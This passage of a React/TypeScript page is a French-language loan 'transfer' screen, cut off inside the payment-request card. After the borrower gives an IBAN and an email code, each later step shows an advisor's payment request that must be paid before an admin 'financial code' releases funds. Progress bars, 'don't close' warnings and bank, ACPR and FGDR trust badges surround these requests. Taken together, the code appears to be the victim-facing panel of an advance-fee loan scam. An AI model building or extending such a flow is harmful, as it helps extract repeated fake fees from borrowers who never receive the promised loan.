import { useState, useEffect, useCallback } from "react";
import { UserLayout } from "@/components/layout/UserLayout";
import { useGetDashboardStats } from "@workspace/api-client-react";
import {
  CheckCircle, Lock, Banknote, Info, Shield, Clock,
  ArrowRight, BadgeCheck, Landmark, RefreshCw, ChevronRight, Zap, Loader2,
  CreditCard, MessageSquare, ShieldCheck, Award, Star,
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getBanqueBySlug } from "@/lib/banques";
import { useTranslation } from "react-i18next";

const BASE = import.meta.env.VITE_API_URL ?? "";

const LIBELLE_KEYS: Record<number, string> = {
  2: "transfert.step_libelle_2",
  3: "transfert.step_libelle_3",
  4: "transfert.step_libelle_4",
};

interface Virement {
  id: number;
  statut: string;
  etapeCourante: number;
  iban: string;
  bic: string;
  titulaire: string;
  montant: number;
  emailCodeValidatedAt1: string | null;
  codeFinancierSentAt2: string | null;
  codeFinancierSentAt3: string | null;
  codeFinancierSentAt4: string | null;
  etape1CompletedAt: string | null;
  etape2CompletedAt: string | null;
  etape3CompletedAt: string | null;
  etape4CompletedAt: string | null;
  paiementMontant2: number | null;
  paiementMontant3: number | null;
  paiementMontant4: number | null;
  paiementDemandeAt2: string | null;
  paiementDemandeAt3: string | null;
  paiementDemandeAt4: string | null;
  paiementConfirmeAt2: string | null;
  paiementConfirmeAt3: string | null;
  paiementConfirmeAt4: string | null;
  completedAt: string | null;
}

function OtpInput({
  value,
  onChange,
  onComplete,
  disabled,
}: {
  value: string;
  onChange: (v: string) => void;
  onComplete?: () => void;
  disabled?: boolean;
}) {
  function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
    const next = e.target.value.replace(/\D/g, "").slice(0, 6);
    onChange(next);
    if (next.length === 6) onComplete?.();
  }
  return (
    <input
      type="text"
      inputMode="numeric"
      autoComplete="one-time-code"
      placeholder="· · · · · ·"
      value={value}
      onChange={handleChange}
      disabled={disabled}
      maxLength={6}
      className="w-full border-2 border-gray-200 rounded-xl px-4 py-4 font-mono text-2xl text-center tracking-[0.6em] text-[#0D1F3C] focus:outline-none focus:border-[#0D1F3C] focus:ring-2 focus:ring-[#0D1F3C]/10 transition-all disabled:opacity-50 bg-white placeholder:tracking-[0.6em] placeholder:text-gray-300"
    />
  );
}

function IbanField({ label, value }: { label: string; value: string }) {
  const { t } = useTranslation();
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(value);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <div className="flex items-center justify-between py-3 border-b border-gray-100 last:border-0">
      <div>
        <div className="text-[10px] text-gray-400 uppercase tracking-widest mb-0.5">{label}</div>
        <div className="font-mono font-semibold text-[#0D1F3C] text-sm">{value}</div>
      </div>
      <button
        onClick={copy}
        className="ml-4 shrink-0 flex items-center gap-1.5 text-[10px] font-bold px-3 py-1.5 rounded-lg border transition-all"
        style={copied
          ? { background: "#dcfce7", borderColor: "#86efac", color: "#16a34a" }
          : { background: "#f4f6fb", borderColor: "#e5e7eb", color: "#6b7280" }}
      >
        {copied
          ? <><CheckCircle className="w-3 h-3" /> {t("transfert.copy_yes")}</>
          : <><RefreshCw className="w-3 h-3" /> {t("transfert.copy_no")}</>}
      </button>
    </div>
  );
}

export default function UserTransfert() {
  const { t } = useTranslation();
  const { data: stats } = useGetDashboardStats();
  const { toast } = useToast();

  const dossier = stats?.dossierActif;
  const isVerse = dossier?.statut === "verse" || dossier?.statut === "transfert_effectue";

  const [virement, setVirement] = useState<Virement | null>(null);
  const [loadingVirement, setLoadingVirement] = useState(true);

  const [form, setForm] = useState({ iban: "", bic: "", titulaire: "" });
  const [initiating, setInitiating] = useState(false);

  const [emailCode, setEmailCode] = useState("");
  const [adminCode, setAdminCode] = useState("");
  const [submittingEmail, setSubmittingEmail] = useState(false);
  const [submittingAdmin, setSubmittingAdmin] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(0);
  const [resendLoading, setResendLoading] = useState(false);
  const [successData, setSuccessData] = useState<{ etape: number; isComplete: boolean; nextVirement: Virement } | null>(null);
  const [banqueSlug, setBanqueSlug] = useState<string>("");

  useEffect(() => {
    fetch(`${BASE}/api/settings/banque-partenaire`)
      .then(r => r.ok ? r.json() : null)
      .then(data => { if (data?.value) setBanqueSlug(data.value); })
      .catch(() => {});
  }, []);

  const loadVirement = useCallback(() => {
    fetch(`${BASE}/api/virements/mon-virement`, { credentials: "include" })
      .then(r => r.ok ? r.json() : null)
      .then(data => { setVirement(data); setLoadingVirement(false); })
      .catch(() => setLoadingVirement(false));
  }, []);

  useEffect(() => { loadVirement(); }, [loadVirement]);

  useEffect(() => {
    if (resendCooldown <= 0) return;
    const timer = setTimeout(() => setResendCooldown(c => c - 1), 1000);
    return () => clearTimeout(timer);
  }, [resendCooldown]);

  useEffect(() => {
    if (!virement || virement.statut !== "en_cours") return undefined;
    const etape = virement.etapeCourante;
    if (etape < 2) return undefined;
    const etapeCompKey = `etape${etape}CompletedAt` as keyof Virement;
    if (!virement[etapeCompKey]) {
      const interval = setInterval(loadVirement, 7000);
      return () => clearInterval(interval);
    }
    return undefined;
  }, [virement, loadVirement]);

  async function initierVirement() {
    if (!form.iban || !form.bic || !form.titulaire) {
      toast({ title: t("transfert.missing_fields"), description: t("transfert.missing_fields_desc"), variant: "destructive" });
      return;
    }
    setInitiating(true);
    const r = await fetch(`${BASE}/api/virements/initier`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify(form),
    });
    setInitiating(false);
    if (r.ok) {
      const data = await r.json();
      setVirement(data);
      toast({ title: t("transfert.verif_started"), description: t("transfert.verif_started_desc") });
    } else {
      const err = await r.json().catch(() => ({}));
      toast({ title: t("transfert.error"), description: err.error ?? t("transfert.error_desc"), variant: "destructive" });
    }
  }

  async function validerEmail() {
    if (emailCode.length < 6 || !virement) return;
    setSubmittingEmail(true);
    const r = await fetch(`${BASE}/api/virements/${virement.id}/valider-email`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify({ code: emailCode.trim() }),
    });
    setSubmittingEmail(false);
    if (r.ok) {
      setEmailCode("");
      const data = await r.json();
      setVirement(data);
      toast({ title: t("transfert.identity_confirmed"), description: t("transfert.identity_confirmed_desc") });
    } else {
      const err = await r.json().catch(() => ({}));
      toast({ title: t("transfert.code_incorrect"), description: err.error ?? t("transfert.code_incorrect_desc"), variant: "destructive" });
    }
  }

  async function validerAdmin() {
    if (!adminCode.trim() || !virement) return;
    setSubmittingAdmin(true);
    const r = await fetch(`${BASE}/api/virements/${virement.id}/valider-financier`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify({ code: adminCode.trim() }),
    });
    setSubmittingAdmin(false);
    if (r.ok) {
      setAdminCode("");
      const data = await r.json();
      setSuccessData({ etape: virement.etapeCourante, isComplete: data.statut === "complete", nextVirement: data });
    } else {
      const err = await r.json().catch(() => ({}));
      toast({ title: t("transfert.code_incorrect"), description: err.error ?? t("transfert.code_incorrect_desc"), variant: "destructive" });
    }
  }

  function continuerApresSucces() {
    if (!successData) return;
    setVirement(successData.nextVirement);
    setSuccessData(null);
  }

  async function annulerVirement() {
    if (!virement) return;
    const r = await fetch(`${BASE}/api/virements/${virement.id}/annuler`, {
      method: "POST",
      credentials: "include",
    });
    if (r.ok) {
      setVirement(null);
      setForm({ iban: "", bic: "", titulaire: "" });
      toast({ title: t("transfert.cancelled"), description: t("transfert.cancelled_desc") });
    } else {
      const err = await r.json().catch(() => ({}));
      toast({ title: t("transfert.error"), description: err.error ?? t("transfert.error_desc"), variant: "destructive" });
    }
  }

  async function renvoyerCode() {
    if (!virement || resendCooldown > 0 || resendLoading) return;
    setResendLoading(true);
    const r = await fetch(`${BASE}/api/virements/${virement.id}/renvoyer-code-email`, {
      method: "POST",
      credentials: "include",
    });
    setResendLoading(false);
    if (r.ok) {
      setEmailCode("");
      setResendCooldown(60);
      toast({ title: t("transfert.code_resent"), description: t("transfert.code_resent_desc") });
    } else {
      toast({ title: t("transfert.error"), description: t("transfert.error_desc"), variant: "destructive" });
    }
  }

  const montantFormate = dossier?.montantDemande
    ? Number(dossier.montantDemande).toLocaleString("fr-FR", { style: "currency", currency: "EUR" })
    : "—";

  // ── Fonds non disponibles ─────────────────────────────────────────────────
  if (!isVerse) {
    return (
      <UserLayout>
        <div className="max-w-lg mx-auto pt-6">
          <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
            <div className="bg-gradient-to-br from-[#0D1F3C] to-[#1a3060] px-8 py-10 text-center">
              <div className="w-20 h-20 rounded-full bg-white/10 flex items-center justify-center mx-auto mb-5">
                <Lock className="w-9 h-9 text-white/60" />
              </div>
              <h2 className="text-xl font-extrabold text-white mb-2">{t("transfert.locked_title")}</h2>
              <p className="text-white/50 text-sm">{t("transfert.locked_desc")}</p>
            </div>
            <div className="px-8 py-6 space-y-4">
              {[
                { step: 1, label: t("transfert.step_submitted"), done: true },
                { step: 2, label: t("transfert.step_instruction"), done: false },
                { step: 3, label: t("transfert.step_decision"), done: false },
                { step: 4, label: t("transfert.step_transfer"), done: false },
              ].map(({ step, label, done }) => (
                <div key={step} className="flex items-center gap-4">
                  <div className={`w-8 h-8 rounded-full flex items-center justify-center shrink-0 text-xs font-bold ${done ? "bg-green-500 text-white" : "bg-gray-100 text-gray-400 border-2 border-gray-200"}`}>
                    {done ? <CheckCircle className="w-4 h-4" /> : step}
                  </div>
                  <span className={`text-sm font-semibold ${done ? "text-green-700" : "text-gray-400"}`}>{label}</span>
                  {step < 4 && <div className="ml-auto"><ChevronRight className="w-4 h-4 text-gray-200" /></div>}
                </div>
              ))}
            </div>
          </div>
        </div>
      </UserLayout>
    );
  }

  // ── Chargement ────────────────────────────────────────────────────────────
  if (loadingVirement) {
    return (
      <UserLayout>
        <div className="max-w-lg mx-auto pt-6 space-y-4">
          <div className="h-36 bg-gray-100 rounded-2xl animate-pulse" />
          <div className="h-72 bg-gray-100 rounded-2xl animate-pulse" />
        </div>
      </UserLayout>
    );
  }

  // ── Transfert complété ─────────────────────────────────────────────────────
  if (virement?.statut === "complete") {
    return (
      <UserLayout>
        <div className="max-w-lg mx-auto pt-6">
          <div className="bg-white border border-green-200 rounded-2xl shadow-sm overflow-hidden">
            <div className="bg-gradient-to-br from-[#065F46] to-[#047857] px-8 py-10 text-center relative overflow-hidden">
              <div className="absolute inset-0 opacity-10" style={{ backgroundImage: "radial-gradient(circle at 20% 50%, #fff 0%, transparent 50%), radial-gradient(circle at 80% 20%, #fff 0%, transparent 40%)" }} />
              <div className="w-20 h-20 rounded-full bg-white/20 flex items-center justify-center mx-auto mb-5 ring-4 ring-white/10">
                <BadgeCheck className="w-10 h-10 text-white" />
              </div>
              <h2 className="text-2xl font-extrabold text-white mb-1">{t("transfert.complete_title")}</h2>
              <p className="text-white/60 text-sm">{dossier?.reference}</p>
              <div className="mt-4 inline-block bg-white/10 border border-white/20 rounded-xl px-6 py-3">
                <div className="text-3xl font-extrabold text-[#FFD500]">
                  {virement.montant.toLocaleString("fr-FR", { style: "currency", currency: "EUR" })}
                </div>
                <div className="text-white/50 text-xs mt-0.5">{t("transfert.in_progress_label")}</div>
              </div>
            </div>
            <div className="px-8 py-6">
              <div className="divide-y divide-gray-100 mb-5">
                <IbanField label={t("transfert.holder_label")} value={virement.titulaire} />
                <IbanField label="IBAN" value={virement.iban} />
                <IbanField label="BIC / SWIFT" value={virement.bic} />
                <div className="flex items-center justify-between py-3">
                  <div>
                    <div className="text-[10px] text-gray-400 uppercase tracking-widest mb-0.5">{t("transfert.authorized_on")}</div>
                    <div className="font-semibold text-green-700 text-sm">
                      {new Date(virement.completedAt!).toLocaleDateString("fr-FR", { day: "2-digit", month: "long", year: "numeric" })}
                    </div>
                  </div>
                  <span className="flex items-center gap-1.5 text-xs font-bold text-green-600 bg-green-50 border border-green-200 px-3 py-1.5 rounded-full">
                    <CheckCircle className="w-3.5 h-3.5" /> {t("transfert.validated_badge")}
                  </span>
                </div>
              </div>
              <div className="flex items-start gap-3 bg-blue-50 border border-blue-100 rounded-xl px-4 py-3">
                <Info className="w-4 h-4 text-blue-500 shrink-0 mt-0.5" />
                <p className="text-xs text-blue-700 leading-relaxed">{t("transfert.funds_credit")}</p>
              </div>
            </div>
          </div>
        </div>
      </UserLayout>
    );
  }

  // ── Formulaire d'initiation ─────────────────────────────────────────────────
  if (!virement) {
    return (
      <UserLayout>
        <div className="max-w-lg mx-auto pt-6 space-y-5">
          <div className="relative bg-gradient-to-br from-[#0D1F3C] to-[#162B52] rounded-2xl px-7 py-6 overflow-hidden shadow-lg">
            <div className="absolute inset-0 opacity-5" style={{ backgroundImage: "radial-gradient(circle at 80% 0%, #FFD500 0%, transparent 60%)" }} />
            <div className="flex items-start justify-between">
              <div>
                <div className="flex items-center gap-2 mb-3">
                  <div className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
                  <span className="text-green-400 text-xs font-bold uppercase tracking-widest">{t("transfert.funds_available")}</span>
                </div>
                <div className="text-4xl font-extrabold text-white tracking-tight">{montantFormate}</div>
                <div className="flex items-center gap-2 mt-2">
                  <span className="text-white/40 text-xs font-mono">{dossier?.reference}</span>
                  <span className="text-white/20">·</span>
                  <span className="text-white/40 text-xs">{dossier?.territoire}</span>
                </div>
              </div>
              <div className="w-14 h-14 rounded-2xl bg-[#FFD500]/20 flex items-center justify-center border border-[#FFD500]/30 shrink-0">
                <Banknote className="w-7 h-7 text-[#FFD500]" />
              </div>
            </div>
            <div className="mt-5 pt-4 border-t border-white/10 flex items-center gap-2">
              <Shield className="w-3.5 h-3.5 text-white/30 shrink-0" />
              <span className="text-white/30 text-[10px]">{t("transfert.secure_notice")}</span>
            </div>
          </div>

          <div className="bg-white border border-gray-200 rounded-2xl shadow-sm px-6 py-5">
            <div className="flex items-center gap-2 mb-4">
              <Zap className="w-4 h-4 text-[#FFD500]" />
              <span className="font-extrabold text-[#0D1F3C] text-sm">{t("transfert.procedure_title")}</span>
            </div>
            <div className="space-y-3">
              {[
                { n: 1, label: t("transfert.proc_step1_label"), sub: t("transfert.proc_step1_sub") },
                { n: 2, label: t("transfert.proc_step2_label"), sub: t("transfert.proc_step2_sub") },
                { n: 3, label: t("transfert.proc_step3_label"), sub: t("transfert.proc_step3_sub") },
              ].map(({ n, label, sub }) => (
                <div key={n} className="flex items-start gap-3">
                  <div className="w-7 h-7 rounded-full bg-[#0D1F3C]/8 flex items-center justify-center shrink-0 mt-0.5">
                    <span className="text-[#0D1F3C] text-[11px] font-extrabold">{n}</span>
                  </div>
                  <div>
                    <div className="text-sm font-semibold text-[#0D1F3C]">{label}</div>
                    <div className="text-[11px] text-gray-400 mt-0.5">{sub}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
            <div className="px-6 py-5 border-b border-gray-100 bg-[#f8f9fc]">
              <div className="flex items-center gap-3">
                <div className="w-9 h-9 rounded-xl bg-[#0D1F3C] flex items-center justify-center shrink-0">
                  <Landmark className="w-4.5 h-4.5 text-white" />
                </div>
                <div>
                  <h2 className="font-extrabold text-[#0D1F3C] text-sm">{t("transfert.bank_title")}</h2>
                  <p className="text-gray-400 text-[11px] mt-0.5">{t("transfert.bank_subtitle")}</p>
                </div>
              </div>
            </div>
            <div className="px-6 py-5 space-y-4">
              <div>
                <label className="text-[10px] font-extrabold text-gray-500 uppercase tracking-widest block mb-2">IBAN</label>
                <input
                  type="text"
                  placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX"
                  value={form.iban}
                  onChange={e => setForm(f => ({ ...f, iban: e.target.value.toUpperCase() }))}
                  className="w-full border-2 border-gray-200 rounded-xl px-4 py-3 font-mono text-sm text-[#0D1F3C] focus:outline-none focus:border-[#0D1F3C] focus:ring-2 focus:ring-[#0D1F3C]/8 transition-all placeholder:text-gray-300 bg-white"
                />
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="text-[10px] font-extrabold text-gray-500 uppercase tracking-widest block mb-2">BIC / SWIFT</label>
                  <input
                    type="text"
                    placeholder="BNPAFRPP"
                    value={form.bic}
                    onChange={e => setForm(f => ({ ...f, bic: e.target.value.toUpperCase() }))}
                    className="w-full border-2 border-gray-200 rounded-xl px-4 py-3 font-mono text-sm text-[#0D1F3C] focus:outline-none focus:border-[#0D1F3C] focus:ring-2 focus:ring-[#0D1F3C]/8 transition-all placeholder:text-gray-300 bg-white"
                  />
                </div>
                <div>
                  <label className="text-[10px] font-extrabold text-gray-500 uppercase tracking-widest block mb-2">{t("transfert.holder_field")}</label>
                  <input
                    type="text"
                    placeholder={t("transfert.holder_placeholder")}
                    value={form.titulaire}
                    onChange={e => setForm(f => ({ ...f, titulaire: e.target.value }))}
                    className="w-full border-2 border-gray-200 rounded-xl px-4 py-3 text-sm text-[#0D1F3C] focus:outline-none focus:border-[#0D1F3C] focus:ring-2 focus:ring-[#0D1F3C]/8 transition-all placeholder:text-gray-300 bg-white"
                  />
                </div>
              </div>
            </div>
            <div className="px-6 pb-6">
              <button
                onClick={initierVirement}
                disabled={initiating || !form.iban || !form.bic || !form.titulaire}
                className="w-full flex items-center justify-center gap-3 py-4 rounded-xl font-extrabold text-sm transition-all disabled:opacity-40 disabled:cursor-not-allowed"
                style={{ background: "linear-gradient(135deg, #FFD500 0%, #FFD500 100%)", color: "white", boxShadow: !initiating && form.iban && form.bic && form.titulaire ? "0 4px 20px rgba(181,135,42,0.35)" : "none" }}
              >
                <Shield className="w-4 h-4" />
                {initiating ? t("transfert.init_loading") : t("transfert.init_start")}
                {!initiating && <ArrowRight className="w-4 h-4" />}
              </button>
              <div className="flex items-center justify-center gap-1.5 mt-3 text-[10px] text-gray-400">
                <Lock className="w-3 h-3" />
                <span>{t("transfert.encrypted_notice")}</span>
              </div>
            </div>
          </div>
        </div>
      </UserLayout>
    );
  }

  // ── Vérification en cours ──────────────────────────────────────────────────
  const etape = virement.etapeCourante;
  const sentAtKey = `codeFinancierSentAt${etape}` as keyof Virement;
  const codeAdminSent = etape >= 2 ? !!virement[sentAtKey] : false;
  const paiementDemandeAt = etape >= 2 ? (virement[`paiementDemandeAt${etape}` as keyof Virement] as string | null) : null;
  const paiementConfirmeAt = etape >= 2 ? (virement[`paiementConfirmeAt${etape}` as keyof Virement] as string | null) : null;
  const paiementMontant = etape >= 2 ? (virement[`paiementMontant${etape}` as keyof Virement] as number | null) : null;
  const montantStr = paiementMontant ? paiementMontant.toLocaleString("fr-FR", { style: "currency", currency: "EUR" }) : null;
  const banque = banqueSlug ? getBanqueBySlug(banqueSlug) : null;
  const isLastEtape = etape === 4;

  return (
    <UserLayout>
      <div className="max-w-lg mx-auto pt-6 space-y-5">

        {/* Encart montant compact */}
        <div className="relative bg-gradient-to-br from-[#0D1F3C] to-[#162B52] rounded-2xl px-7 py-5 overflow-hidden shadow-lg">
          <div className="absolute inset-0 opacity-5" style={{ backgroundImage: "radial-gradient(circle at 80% 0%, #FFD500 0%, transparent 60%)" }} />
          <div className="flex items-center justify-between">
            <div>
              <div className="text-[10px] text-white/40 uppercase tracking-widest mb-1">{t("transfert.in_progress_banner")}</div>
              <div className="text-3xl font-extrabold text-white">{virement.montant.toLocaleString("fr-FR", { style: "currency", currency: "EUR" })}</div>
              <div className="text-white/40 text-xs font-mono mt-1">{dossier?.reference}</div>
            </div>
            <div className="w-12 h-12 rounded-2xl bg-[#FFD500]/20 flex items-center justify-center border border-[#FFD500]/30 shrink-0">
              <Banknote className="w-6 h-6 text-[#FFD500]" />
            </div>
          </div>
        </div>

        {/* ── Carte bancaire partenaire ──────────────────────────────────────── */}
        {banque && etape >= 2 && !successData && (
          <div className="relative bg-white rounded-2xl overflow-hidden shadow-[0_2px_20px_rgba(0,0,0,0.08)] border border-gray-100">
            <div className="h-1 w-full" style={{ background: `linear-gradient(90deg, ${banque.couleur}, ${banque.couleur}99)` }} />
            <div className="px-6 pt-5 pb-4">
              <div className="flex items-start justify-between mb-4">
                <div className="flex items-center gap-3">
                  <div
                    className="w-[88px] h-[32px] rounded-md overflow-hidden flex-shrink-0"
                    style={{ filter: "drop-shadow(0 1px 3px rgba(0,0,0,0.12))" }}
                    dangerouslySetInnerHTML={{ __html: banque.logo }}
                  />
                </div>
                <div className="flex items-center gap-1.5 bg-emerald-50 border border-emerald-200 rounded-full px-2.5 py-1">
                  <ShieldCheck className="w-3 h-3 text-emerald-600 flex-shrink-0" strokeWidth={2.5} />
                  <span className="text-[10px] font-bold text-emerald-700 uppercase tracking-wider">{t("transfert.acpr")}</span>
                </div>
              </div>
              <div className="mb-4">
                <p className="text-[10px] font-bold text-gray-400 uppercase tracking-[0.12em] mb-0.5">{t("transfert.partner_bank")}</p>
                <p className="text-[17px] font-extrabold text-[#0D1F3C] leading-tight">{banque.nom}</p>
              </div>
              <div className="h-px bg-gray-100 mb-4" />
              <div className="grid grid-cols-3 gap-3">
                <div className="flex flex-col gap-0.5">
                  <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest">{t("transfert.network_label")}</p>
                  <p className="text-[11px] font-bold text-[#0D1F3C]">SEPA / SWIFT</p>
                </div>
                <div className="flex flex-col gap-0.5">
                  <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest">{t("transfert.guarantee_label")}</p>
                  <p className="text-[11px] font-bold text-[#0D1F3C]">Fonds FGDR</p>
                </div>
                <div className="flex flex-col gap-0.5">
                  <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest">{t("transfert.country_label")}</p>
                  <p className="text-[11px] font-bold text-[#0D1F3C]">{banque.pays}</p>
                </div>
              </div>
            </div>
            <div className="px-6 py-3 bg-gray-50 border-t border-gray-100 flex items-center gap-2">
              <Award className="w-3.5 h-3.5 text-gray-400 flex-shrink-0" />
              <p className="text-[10px] text-gray-400 leading-snug">
                {t("transfert.fee_disclaimer", { nom: banque.nom })}
              </p>
            </div>
          </div>
        )}

        {/* ── Badge dernière étape ─────────────────────────────────────────── */}
        {isLastEtape && !successData && (
          <div className="relative bg-gradient-to-r from-[#0D1F3C] to-[#162B52] rounded-2xl overflow-hidden shadow-md">
            <div className="absolute left-0 top-0 bottom-0 w-1 bg-gradient-to-b from-[#FFD500] to-[#FFD500]" />
            <div className="pl-7 pr-6 py-4 flex items-center gap-4">
              <div className="w-10 h-10 rounded-xl bg-[#FFD500]/20 border border-[#FFD500]/30 flex items-center justify-center flex-shrink-0">
                <Star className="w-5 h-5 text-[#FFD500]" fill="#FFD500" />
              </div>
              <div>
                <p className="text-xs font-extrabold text-[#FFD500] uppercase tracking-widest mb-0.5">{t("transfert.final_step_label")} · 75%</p>
                <p className="text-sm font-bold text-white leading-snug">{t("transfert.final_step_title")}</p>
                <p className="text-[11px] text-white/50 mt-0.5">{t("transfert.final_step_sub")}</p>
              </div>
            </div>
          </div>
        )}

        {/* ── Écran de succès intermédiaire ─────────────────────────────────── */}
        {successData && (
          <div className="bg-white border border-green-200 rounded-2xl shadow-sm overflow-hidden">
            <div className="px-6 pt-10 pb-6 flex flex-col items-center text-center gap-4">
              <div className="relative">
                <div className="w-20 h-20 rounded-full bg-green-50 border-4 border-green-200 flex items-center justify-center">
                  <CheckCircle className="w-10 h-10 text-green-500" strokeWidth={2.5} />
                </div>
                <div className="absolute -top-1 -right-1 h-6 rounded-full bg-[#FFD500] flex items-center justify-center text-white text-[10px] font-extrabold shadow px-2">
                  {Math.round((successData.etape / 4) * 100)}%
                </div>
              </div>

              {successData.isComplete ? (
                <>
                  <div>
                    <p className="text-xl font-extrabold text-[#0D1F3C] mb-1">{t("transfert.success_complete_title")}</p>
                    <p className="text-sm text-gray-500 leading-relaxed">
                      {t("transfert.success_complete_all")}<br />
                      {t("transfert.success_complete_funds")}
                    </p>
                  </div>
                  <div className="w-full bg-green-50 border border-green-100 rounded-xl px-5 py-3">
                    <p className="text-xs text-green-700 leading-relaxed">
                      {t("transfert.success_complete_email")}
                    </p>
                  </div>
                </>
              ) : (
                <>
                  <div>
                    <p className="text-xl font-extrabold text-[#0D1F3C] mb-1">
                      {t(LIBELLE_KEYS[successData.etape])}
                    </p>
                    <p className="text-sm text-gray-500 leading-relaxed">
                      {t("transfert.success_step_desc", { pct: Math.round((successData.etape / 4) * 100) })}
                    </p>
                  </div>
                  <div className="w-full">
                    <div className="flex justify-between text-[10px] font-bold text-gray-400 mb-1.5">
                      <span>{t("transfert.progress_label")}</span>
                      <span className="text-[#FFD500]">{Math.round((successData.etape / 4) * 100)}%</span>
                    </div>
                    <div className="w-full h-2 bg-gray-100 rounded-full overflow-hidden">
                      <div
                        className="h-full rounded-full transition-all duration-700"
                        style={{ width: `${Math.round((successData.etape / 4) * 100)}%`, background: "linear-gradient(90deg, #FFD500, #FFD500)" }}
                      />
                    </div>
                  </div>
                </>
              )}

              <button
                onClick={continuerApresSucces}
                className="w-full mt-2 py-3.5 rounded-xl font-extrabold text-sm text-white flex items-center justify-center gap-2 transition-all"
                style={{ background: successData.isComplete ? "linear-gradient(135deg, #15803d 0%, #16a34a 100%)" : "linear-gradient(135deg, #0D1F3C 0%, #162B52 100%)" }}
              >
                {successData.isComplete
                  ? <><BadgeCheck className="w-4 h-4" /> {t("transfert.see_dossier")}</>
                  : <><ArrowRight className="w-4 h-4" /> {t("transfert.continue_btn")}</>}
              </button>
            </div>
          </div>
        )}

        {/* Étape 1 : vérification d'identité par email */}
        {!successData && etape === 1 && (
          <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
            <div className="px-6 py-5 border-b border-gray-100 bg-[#f8f9fc]">
              <div className="flex items-center gap-3">
                <div className="w-9 h-9 rounded-xl bg-[#0D1F3C] flex items-center justify-center shrink-0">
                  <Shield className="w-4 h-4 text-white" />
                </div>
                <div>
                  <h2 className="font-extrabold text-[#0D1F3C] text-sm">{t("transfert.id_verif_title")}</h2>
                  <p className="text-gray-400 text-[11px] mt-0.5">{t("transfert.id_verif_sub")}</p>
                </div>
              </div>
            </div>
            <div className="px-6 py-5 space-y-4">
              <OtpInput
                value={emailCode}
                onChange={setEmailCode}
                onComplete={validerEmail}
                disabled={submittingEmail}
              />
              <button
                onClick={validerEmail}
                disabled={emailCode.length < 6 || submittingEmail}
                className="w-full py-3.5 rounded-xl font-extrabold text-sm text-white transition-all disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                style={{ background: "linear-gradient(135deg, #0D1F3C 0%, #162B52 100%)" }}
              >
                {submittingEmail
                  ? <><Loader2 className="w-4 h-4 animate-spin" /> {t("transfert.verif_loading_btn")}</>
                  : <><CheckCircle className="w-4 h-4" /> {t("transfert.confirm_identity")}</>}
              </button>
              <div className="flex items-center justify-between pt-1">
                <button
                  onClick={renvoyerCode}
                  disabled={resendCooldown > 0 || resendLoading}
                  className="text-xs text-gray-400 hover:text-[#0D1F3C] transition-colors disabled:opacity-40 disabled:cursor-not-allowed flex items-center gap-1.5"
                >
                  <RefreshCw className="w-3 h-3" />
                  {resendCooldown > 0
                    ? t("transfert.resend_cooldown", { s: resendCooldown })
                    : t("transfert.resend_code")}
                </button>
                <button
                  onClick={annulerVirement}
                  className="text-xs text-red-400 hover:text-red-600 transition-colors"
                >
                  {t("transfert.cancel")}
                </button>
              </div>
            </div>
            <div className="px-6 pb-5">
              <div className="flex items-start gap-2 bg-blue-50 border border-blue-100 rounded-xl px-4 py-3">
                <Info className="w-4 h-4 text-blue-500 shrink-0 mt-0.5" />
                <p className="text-xs text-blue-700 leading-relaxed">{t("transfert.check_spam")}</p>
              </div>
            </div>
          </div>
        )}

        {/* ── État A : Aucune demande de paiement encore ─────────────────── */}
        {!successData && etape >= 2 && !paiementDemandeAt && (
          <div className="bg-white border border-gray-200 rounded-2xl shadow-sm overflow-hidden">
            <div className="px-6 py-5 border-b border-gray-100 bg-[#f8f9fc]">
              <div className="flex items-center gap-3">
                <div className="w-9 h-9 rounded-xl bg-[#0D1F3C]/10 flex items-center justify-center shrink-0">
                  <Clock className="w-4 h-4 text-[#0D1F3C]" />
                </div>
                <div>
                  <h2 className="font-extrabold text-[#0D1F3C] text-sm">{t("transfert.processing_title")}</h2>
                  <p className="text-gray-400 text-[11px] mt-0.5">{t("transfert.processing_sub")}</p>
                </div>
              </div>
            </div>
            <div className="px-6 py-8 text-center">
              <div className="w-16 h-16 rounded-full bg-[#0D1F3C]/5 flex items-center justify-center mx-auto mb-4">
                <Loader2 className="w-8 h-8 text-[#0D1F3C]/30 animate-spin" />
              </div>
              <p className="text-sm font-semibold text-[#0D1F3C] mb-1">{t("transfert.advisor_preparing")}</p>
              <p className="text-xs text-gray-400 leading-relaxed">{t("transfert.notified_email")}</p>
            </div>
            <div className="px-6 pb-5">
              <div className="flex items-start gap-2 bg-amber-50 border border-amber-100 rounded-xl px-4 py-3">
                <Info className="w-4 h-4 text-amber-500 shrink-0 mt-0.5" />
                <p className="text-xs text-amber-700 leading-relaxed">{t("transfert.dont_close")}</p>
              </div>
            </div>
          </div>
        )}

        {/* ── État B : Demande de paiement reçue — à régler ──────────────── */}
        {!successData && etape >= 2 && paiementDemandeAt && !paiementConfirmeAt && (
          <div className="bg-white border border-[#FFD500]/40 rounded-2xl shadow-sm overflow-hidden">
            <div className="px-6 py-5 border-b border-[#FFD500]/20 bg-amber-50/60">
              <div className="flex items-center gap-3">
                <div className="w-9 h-9 rounded-xl bg-[#FFD500] flex items-center justify-center shrink-0">
                  <CreditCard className="w-4 h-4 text-white" />
                </div>
                <div>
                  <h2 className="font-extrabold text-[#0D1F3C] text-sm">{t("transfert.payment_request_title")}</h2>
